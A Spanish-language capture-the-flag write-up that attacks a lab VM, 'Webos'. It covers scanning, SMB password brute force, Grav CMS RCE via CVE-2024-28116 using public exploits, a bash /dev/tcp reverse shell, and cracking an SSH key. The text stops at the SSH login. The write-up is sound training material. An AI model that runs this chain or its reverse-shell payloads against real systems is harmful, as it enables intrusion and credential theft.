---
title: "Webos - TheHackerLabs"
date: 2025-08-04
draft: false
slug: "THL-writeup-webos"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, identificamos que se está usando el CMS Grav en la página web activa en el puerto 80, y que necesitamos credenciales válidas para poder ver los recursos compartidos del servicio Samba. Al ver el servicio RPC activo, logramos entrar con una sesión nula, lo que nos permite enumerar los usuarios, siendo así que encontramos un usuario válido al que le aplicamos fuerza bruta con crackmapexec, logrando encontrar su contraseña. Ya con credenciales válidas, enumeramos el servicio Samba, encontrando un archivo de texto que contiene un mensaje codificado en brainfuck. Decodificando ese mensaje, descubrimos que son credenciales para el CMS Grav, con lo que logramos ganar acceso y descubriendo que se está usando la versión 1.7.44. Investigando por internet, encontramos que esta versión es vulnerable a Server Side Template Injection (SSTI), lo que provoca Ejecución Remota de Comandos (RCE). Encontramos dos Exploits que utilizamos para ejecutar comandos y poder enviarnos una Reverse Shell para ganar acceso a la máquina víctima. Dentro, encontramos una llave privada id_rsa que logramos crackear con JohnTheRipper y ganamos acceso a la máquina vía SSH. Dentro del SSH, encontramos el binario python3 en el directorio de nuestro usuario. Si investigamos sus capabilities, descubrimos que tiene la capabilitie cap_setuid, con lo que podemos abusar de este binario para escalar privilegios. Utilizamos un comando de la guía de GTFOBins para abusar de esa capabilitie, logrando convertirnos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "CMS Grav", "Samba", "RPC", "Web Enumeration", "Fuzzing", "RPC Enumeration", "Brute Force Attack", "Samba Enumeration", "Brainfuck Decoding", "Grav CMS Remote Code Execution (Authenticated) - SSTI + RCE", "CVE-2024-28116", "Cracking Hash", "Cracking SSH Private Key", "Abusing Binary Capabilities", "Privesc - Abusing Binary Capabilities", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "ffuf"
  - "crackmapexec"
  - "smbmap"
  - "rpcclient"
  - "cat"
  - "wget"
  - "python3"
  - "nc"
  - "bash"
  - "tcpdump"
  - "nano"
  - "chmod"
  - "ssh2john"
  - "JohnTheRipper"
  - "ssh"
  - "id"
  - "find"
  - "getcap"
links:
  - "https://md5decrypt.net/en/Brainfuck-translator/"
  - "https://github.com/akabe1/Graver"
  - "https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated"
  - "https://gtfobins.github.io/gtfobins/python/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-webos/webos.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.10
PING 192.168.10.10 (192.168.100.10) 56(84) bytes of data.
64 bytes from 192.168.100.10: icmp_seq=1 ttl=64 time=1.75 ms
64 bytes from 192.168.100.10: icmp_seq=2 ttl=64 time=0.981 ms
64 bytes from 192.168.100.10: icmp_seq=3 ttl=64 time=1.00 ms
64 bytes from 192.168.100.10: icmp_seq=4 ttl=64 time=1.04 ms

--- 192.168.100.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3106ms
rtt min/avg/max/mdev = 0.981/1.191/1.746/0.320 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.10 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 12:15 CST
Initiating ARP Ping Scan at 12:15
Scanning 192.168.100.10 [1 port]
Completed ARP Ping Scan at 12:15, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:15
Scanning 192.168.100.10 [65535 ports]
Discovered open port 139/tcp on 192.168.100.10
Discovered open port 80/tcp on 192.168.100.10
Discovered open port 22/tcp on 192.168.100.10
Discovered open port 445/tcp on 192.168.100.10
Completed SYN Stealth Scan at 12:15, 24.53s elapsed (65535 total ports)
Nmap scan report for 192.168.100.10
Host is up, received arp-response (0.00100s latency).
Scanned at 2025-08-04 12:15:15 CST for 25s
Not shown: 54945 closed tcp ports (reset), 10586 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds
           Raw packets sent: 82363 (3.624MB) | Rcvd: 54953 (2.198MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Tenemos 4 puertos abiertos, pero me da mucha curiosidad e interés el ver el **servicio SMB/Samba** activo, pues no es tan común verlo en una máquina **Linux**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,139,445 192.168.100.10 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 12:17 CST
Nmap scan report for 192.168.100.10
Host is up (0.00090s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 d1:ab:7b:af:5c:3b:5e:52:23:9a:97:57:a8:aa:a1:f5 (ECDSA)
|_  256 73:d9:ad:9e:c0:96:12:d8:ed:1b:ee:c0:15:ba:34:98 (ED25519)
80/tcp  open  http        Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: webos.thl | Grav
| http-robots.txt: 13 disallowed entries 
| /.github/ /.phan/ /assets/ /backup/ /bin/ /cache/ /logs/ 
|_/system/ /tests/ /tmp/ /user/ /vendor/ /webserver-configs/
|_http-generator: GravCMS
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: THE HACKERS LABS - WEBOS)
445/tcp open  netbios-ssn Samba smbd 4.17.12-Debian (workgroup: THE HACKERS LABS - WEBOS)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: THEHACKERSLABS-WEBOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:

|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.17.12-Debian)
|   Computer name: thehackerslabs-webos
|   NetBIOS computer name: THEHACKERSLABS-WEBOS\x00
|   Domain name: 
|   FQDN: thehackerslabs-webos
|_  System time: 2025-08-04T20:18:01+02:00
| smb2-time: 
|   date: 2025-08-04T18:18:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Viendo el escaneo, la página web activa en el **puerto 80** muestra bastante contenido como el uso del **CMS Grav** y un dominio **webos.thl**.

Agrega ese dominio al `/etc/hosts`:
```bash
echo "192.168.100.10 webos.thl" >> /etc/hosts
```
Además, el escaneo utilizó el **usuario guest** para intentar entrar al **servicio Samba**, aunque parece que funcionó, no reporto nada.

Vamos a ver primero la página web y después analizaremos el **servicio Samba**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura1.png">
</p>

Estamos ante el login del **CMS Grav**.

Investiguemos de qué se trata este **CMS**:

| **CMS Grav** |
| :----------: |
| *Grav es un CMS (Content Management System) de tipo flat-file, lo que significa que no utiliza una base de datos tradicional como MySQL o PostgreSQL. En lugar de eso, almacena el contenido en archivos de texto (principalmente Markdown) dentro de una estructura de carpetas organizada.* |

Bastante curioso este **CMS**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura2.png">
</p>

Nos reporta el uso del **CMS Grav** y que está hecho en **PHP**.

Esto es bastante útil, pues podemos aplicar **Fuzzing** y enfocarlo en **archivos PHP**.

### Fuzzing y Análisis de Directorios Descubiertos {#fuzz}

Por alguna razón, tarda demasiado el **Fuzzing**, por lo que solamente lo haré con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.10/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.113/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login.txt               [Status: 200, Size: 13647, Words: 3159, Lines: 171, Duration: 156ms]
login.html              [Status: 200, Size: 13647, Words: 3159, Lines: 171, Duration: 156ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 581ms]
login                   [Status: 200, Size: 13647, Words: 3159, Lines: 171, Duration: 924ms]
home.html               [Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 928ms]
home.txt                [Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 992ms]
home                    [Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 994ms]
user                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2438ms]
assets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 881ms]
admin                   [Status: 200, Size: 11127, Words: 3925, Lines: 128, Duration: 3372ms]
admin.html              [Status: 200, Size: 11127, Words: 3925, Lines: 128, Duration: 3261ms]
admin.txt               [Status: 200, Size: 11127, Words: 3925, Lines: 128, Duration: 3858ms]
bin                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1305ms]
system                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1017ms]
cache                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 428ms]
vendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1111ms]
backup                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 532ms]
robots.txt              [Status: 200, Size: 379, Words: 22, Lines: 22, Duration: 453ms]
logs                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 573ms]
forgot_password         [Status: 200, Size: 11764, Words: 2040, Lines: 135, Duration: 877ms]
forgot_password.html    [Status: 200, Size: 11764, Words: 2040, Lines: 135, Duration: 871ms]
forgot_password.txt     [Status: 200, Size: 11764, Words: 2040, Lines: 135, Duration: 874ms]
LICENSE.txt             [Status: 200, Size: 1071, Words: 154, Lines: 22, Duration: 533ms]
tmp                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 4640ms]
user_profile            [Status: 200, Size: 13654, Words: 3159, Lines: 171, Duration: 1830ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 757ms]
user_profile.txt        [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 1890ms]
.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 754ms]
.txt                    [Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 787ms]
user_profile.html       [Status: 200, Size: 13654, Words: 3159, Lines: 171, Duration: 3326ms]
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para indicar extensiones de archivos a buscar. |

Obtuvimos bastantes archivos y directorios, pero por el tiempo que estaba tardando, decidí cancelarlo y analizar algunos de los resultados.

Por ejemplo, ahí podemos ver un directorio llamado **users**, un directorio llamado **backup** (que no tiene nada) y un directorio llamado **admin**.

Entremos al directorio **users**:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura3.png">
</p>

Si entramos al directorio **accounts**, encontraremos un archivo llamado **admin.yaml** que, al descargarlo y leerlo, veremos lo siguiente:
```bash
cat admin.yaml
state: enabled
email: admin@thehackerslabs.com
fullname: TheHackersLabs
title: Administrator
hashed_password: $2y$10$F0k5Ajn42KuhpoAN3Y7FXevY5W2MKHQpwpCKg7EzDxlayLD.iwVJC
language: es
content_editor: default
twofa_enabled: false
twofa_secret: NVNYOYB5IL3NPUKKRX4E6BPCTRWRQNFQ
avatar: {  }
access:
  site:
    login: true
  admin:
    login: true
    super: true
```
Es un hash que no podremos identificar ni crackear, por lo que no nos sirve mucho.

Por último, igual podemos ver el directorio **admin**:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura4.png">
</p>

Tenemos otro login, pero no tenemos credenciales de acceso.

De ahí en fuera, no encontraremos algo más. Entonces, vamos a analizar el **servicio Samba**.

### Análisis del Servicio Samba y Enumeración de Servicio RPC {#SambaRPC}

Veamos qué nos dice **crakmapexec** sobre el **servicio Samba**:
```bash
crackmapexec smb 192.168.100.10
SMB         192.168.100.10 445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
```
Bien, podríamos intentar loguearnos usando el **usuario guest**, pero no podremos.

Aunque con **smbmap** nos mostrará algunos recursos compartidos:
```bash
smbmap -H 192.168.100.10 -u 'guest' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.10:445	Name: webos.thl           	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	webos                                             	NO ACCESS	Archivo compartido en Samba
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	nobody                                            	NO ACCESS	Home Directories
[*] Closed 1 connections
```
Sí te das cuenta, no podremos ver el contenido de los archivos compartidos, pero podemos ver 2 directorios que son **webos** y **nobody**, posiblemente contengan algo que nos ayude.

Lo que necesitamos es un usuario y contraseña.

Como vimos en el escaneo que el **servicio RCP** está activo, podríamos tratar de entrar y enumerarlo.

Usemos una sesión nula primero:
```bash
rpcclient -U '' -N 192.168.100.10
rpcclient $>
```
Muy bien, funcionó.

Veamos qué usuarios existen:
```bash
rpcclient $> enumdomusers
user:[webos] rid:[0x3e8]
rpcclient $>
```
Solamente existe un usuario.

No encontraremos algo más en este servicio más que ese usuario.

Usémoslo para aplicar fuerza bruta con **crackmapexec**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta y Enumeración del Servicio Samba {#FuerzaBrutaEnumSamba}

Usaremos un filtro para que nos muestre solo un resultado válido:
```bash
crackmapexec smb 192.168.100.10 -u 'webos' -p /usr/share/wordlists/rockyou.txt | grep '[+]'
SMB              192.168.100.10 445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\webos:geraldine
```
Tenemos la contraseña.

Ahora sí podemos enumerar los archivos compartidos con **smbmap**:
```bash
smbmap -H 192.168.100.10 -u 'webos' -p 'geraldine' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.10:445	Name: webos.thl           	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	webos                                             	READ ONLY	Archivo compartido en Samba
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
[*] Closed 1 connections
```
Nuestro usuario puede ver dos directorios, pero el que nos interesa es el directorio **webos**.

Veamos qué hay dentro de ese directorio:
```bash
smbmap -H 192.168.100.10 -u 'webos' -p 'geraldine' -r webos --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.10:445	Name: webos.thl           	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	webos                                             	READ ONLY	Archivo compartido en Samba
	./webos
	dr--r--r--                0 Wed Jul 17 12:47:07 2024	.
	dr--r--r--                0 Thu Jul 18 03:31:55 2024	..
	fr--r--r--              245 Wed Jul 17 12:47:07 2024	MamaÑema.txt
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
[*] Closed 1 connections
```
Hay un archivo de texto.

Descarguémoslo:
```bash
smbmap -H 192.168.100.10 -u 'webos' -p 'geraldine' --download webos/MamaÑema.txt --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting download: webos\MamaÑema.txt (245 bytes)                                                                    
[+] File output to: /../TheHackersLabs/Webos/content/192.168.100.10-webos_MamaÑema.txt
[*] Closed 1 connections
```

Y leámoslo:
```bash
cat MamaÑema.txt
++++++++++[>++++++++++>++++++++++>+++++++++++>+++++++++++>+++++++++++>++++++>++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++>+++++++++++>+++++>++++++>++++<<<<<<<<<<<<<<<-]>---.>.>-.>-----.>.>--.>.>+.>++++.>-----.>-.>+.>++++.>---.>++.....
```
Parece ser un mensaje codificado en **brainfuck**.

### Decodificación de Mensaje Codificado en Brainfuck y Ganando Acceso a Login de CMS Grav {#brainfuck}

Podemos decodificar el mensaje con la siguiente página:
* <a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Branfuck Translator</a>

Y obtenemos el siguiente mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura5.png">
</p>

Obtuvimos un usuario y contraseña, aunque esa contraseña parece que está incompleta.

Pero si la utilizamos en el primer login, funciona y nos deja entrar:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura6.png">
</p>

Nos pide otra vez credenciales de acceso y si usamos las mismas, igual funciona y nos deja entrar:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura7.png">
</p>

El problema es que no hay nada aquí, por lo que llegamos a un callejón sin salida.

Pero si regresamos al login que vimos en el directorio **admin** y le damos las mismas credenciales, lograremos ganar acceso:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura8.png">
</p>

Genial, ganamos acceso al **CMS Grav** y ahí mismo podemos ver que es la versión **1.7.44**.

### Abusando de Version Vulnerable del CMS Grav {#CVE}

Si buscamos un Exploit para la **versión 1.7.44 del CMS Grav**, encontraremos una vulnerabilidad que permite la **ejecución remota de comandos (RCE)** asignándole el **CVE-2024-28116**.

Resulta que es posible crear una platilla que sirve para ejecutar la vulnerabilidad **Server Side Template Injection (SSTI)** y también una **ejecución remota de comandos (RCE)**.

Tenemos unos cuantos Exploits de **GitHub** que podemos usar para explotar esta vulnerabilidad.

Vamos a probarlos.

#### Probando Exploit: Graver.py - Explotando un SSTI + RCE {#Exploit1}

Este script crea una página maliciosa que contiene código que ejecuta comandos dentro del **CMS Grav**, justo como un **SSTI + RCE**.

Aquí puedes encontrar el Exploit:
* <a href="https://github.com/akabe1/Graver" target="_blank">Repositorio de akabe1: Graver</a>

Descárgalo con **wget**:
```bash
wget https://raw.githubusercontent.com/akabe1/Graver/refs/heads/main/graver.py
```
El script necesita que lo modifiquemos para agregarle el usuario y contraseña.

Solamente entra y abajo de las librerías verás dónde agregar las credenciales:
```bash
##############################################
# Enter here your Grav CMS editor credentials
username = "admin"
password = "Perico69*****"
##############################################
```
Debe quedar así.

Ahora ejecuta el Exploit:
```bash
python3 graver.py -t http://192.168.100.10 -p 80
RCE payload injected, now visit the malicious page at: 'http://192.168.100.10:80/hacked_RY6V?do='
```
Parece que funcionó.

Comprobémoslo en la sección de páginas del dashboard del **CMS Grav** (recarga la página si es necesario):

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura10.png">
</p>

Ahí está.

Si visitamos la página, veremos que se ejecuta el comando que viene escrito en el código de la página web, siendo el comando **whoami**:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura11.png">
</p>

Pero, se supone que esta página debería servir como una **WebShell**, cosa que no hace.

Si cambiamos el comando a cualquier otro, ese comando se ejecutará. Probemos con el comando **id**:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura12.png">
</p>

Y si recargamos la página, el comando se ejecuta:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura13.png">
</p>

Entonces, podemos modificarlo para agregar una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Modifica el comando para agregar la **Reverse Shell**:
```bash
'bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"'
```

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura14.png">
</p>

Una vez que guardes los cambios, vuelve a la página, recárgala y observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.10] 47350
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Webos:/var/www/html$ whoami
whoami
www-data
```
Estamos dentro.

Ya solo falta obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

#### Probando Exploit: Grav CMS Remote Code Execution (Authenticated) - CVE-2024-28116 {#Exploit2}

Este Exploit es similar, pero automatiza el proceso de cambiar el comando a ejecutar desde el mismo Exploit.

A diferencia del otro Exploit, aquí tenemos que darle el usuario, la contraseña y el comando a ejecutar mediante flags. Además, elimina automáticamente la página creada, por lo que solo se ejecuta el comando y no se guarda el payload.

Aquí lo puedes encontrar:
* <a href="https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated" target="_blank">Repositorio de gunzf0z: Grav CMS Remote Code Execution (Authenticated) - CVE-2024-28116</a>

Puedes descargar solo el Exploit con **wget**:
```bash
wget https://raw.githubusercontent.com/gunzf0x/Grav-CMS-RCE-Authenticated/refs/heads/main/Grav_CMS_RCE.py
```
En el repo, nos muestra un ejemplo de cómo manda una **traza ICMP** a una IP, así que repliquémoslo.

Inicia una captura de **paquetes ICMP** con **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Ejecuta el mismo comando, mandando la traza a tu IP:
```bash
python3 Grav_CMS_RCE.py -t 192.168.100.10 -u 'admin' -p 'Perico69*****' -x 'ping -c 1 Tu_IP'
[*] Attacking 'http://192.168.100.10:80'...
[*] Uploading payload...
[*] Executing payload...
[*] Payload deleted. Actually, what payload? Nothing happened here ;) 

    ~Happy hacking
```

Observa **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:33:05.219172 IP Tu_IP > 192.168.100.10: ICMP echo request, id 11, seq 0, length 64
13:33:05.219781 IP 192.168.100.10 > Tu_IP: ICMP echo reply, id 11, seq 0, length 64
...
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```
Funciona muy bien. Entonces, vamos a mandarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Cambia el comando por la misma **Reverse Shell** que ocupamos con el Exploit anterior:
```bash
python3 Grav_CMS_RCE.py -t 192.168.100.10 -u 'admin' -p 'Perico69*****' -x 'bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"'
[*] Attacking 'http://192.168.100.10:80'...
[*] Uploading payload...
[*] Executing payload...
```
Ve cómo se queda ejecutando el Exploit.

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.10] 57510
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Webos:/var/www/html$ whoami
whoami
www-data
```
Estamos dentro de nuevo.

Ya solo falta obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa {#linEnum}

Veamos qué usuarios existen en la máquina:
```bash
www-data@TheHackersLabs-Webos:/var/www/html$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
webos:x:1001:1001::/home/webos:/bin/bash
```
Hay dos usuarios.

Podemos ver el contenido del **usuario webos**:
```bash
www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jul  6  2024 .
drwxr-xr-x 18 root   root   4096 Jul  6  2024 ..
drwx------  2 debian debian 4096 Jul  1  2024 debian
drwxr-xr-x  5 webos  webos  4096 Jul 18  2024 webos
```

Pero no hay mucho que podamos ver, pero es un poco extraño ver el binario **python3** en un directorio de un usuario:
```bash
www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /home/webos/
total 6716
drwxr-xr-x 5 webos webos    4096 Jul 18  2024 .
drwxr-xr-x 4 root  root     4096 Jul  6  2024 ..
lrwxrwxrwx 1 root  root        9 Jul 18  2024 .bash_history -> /dev/null
-rw-r--r-- 1 webos webos     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 webos webos    3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 webos webos    4096 Jul  6  2024 .local
-rw-r--r-- 1 webos webos     807 Apr 23  2023 .profile
drwx------ 2 webos webos    4096 Jul  6  2024 .ssh
-rwxr-xr-x 1 root  root  6839928 Jul  6  2024 python3
-r-------- 1 webos webos      36 Jul 18  2024 user.txt
drwxr-xr-x 2 webos webos    4096 Jul 17  2024 webito
```

Buscando un poco por ahí, encontraremos algo interesante en el directorio `/opt`:
```bash
www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /opt
total 12
drwxr-xr-x  2 webos webos 4096 Jul  6  2024 .
drwxr-xr-x 18 root  root  4096 Jul  6  2024 ..
-rw-r--r--  1 webos webos 3434 Jul  6  2024 id_rsa
```

Encontramos una **llave privada id_rsa** del **usuario webos** y podemos leerla:
```bash
www-data@TheHackersLabs-Webos:/var/www/html$ cat /opt/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAA
...
...
```

Cópiala, pégala en tu máquina y dale los permisos correspondientes:
```bash
nano id_rsa
------------
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAA
...
-----------
chmod 600 id_rsa
```
Vamos a crackear esta llave.

Primero, obtengamos el hash de la llave:
```bash
ssh2john id_rsa > hash
```

Ahora, usemos **JohnTheRipper** para crackearla:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
freestyle        (id_rsa)     
1g 0:00:01:46 DONE (2025-08-04 13:44) 0.009427g/s 33.03p/s 33.03c/s 33.03C/s girls..alone
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Excelente, tenemos la frase de la llave privada.

Autentiquémonos vía **SSH** usando esa llave y el **usuario webos**:
```bash
ssh -i id_rsa webos@192.168.100.10
Enter passphrase for key 'id_rsa': 
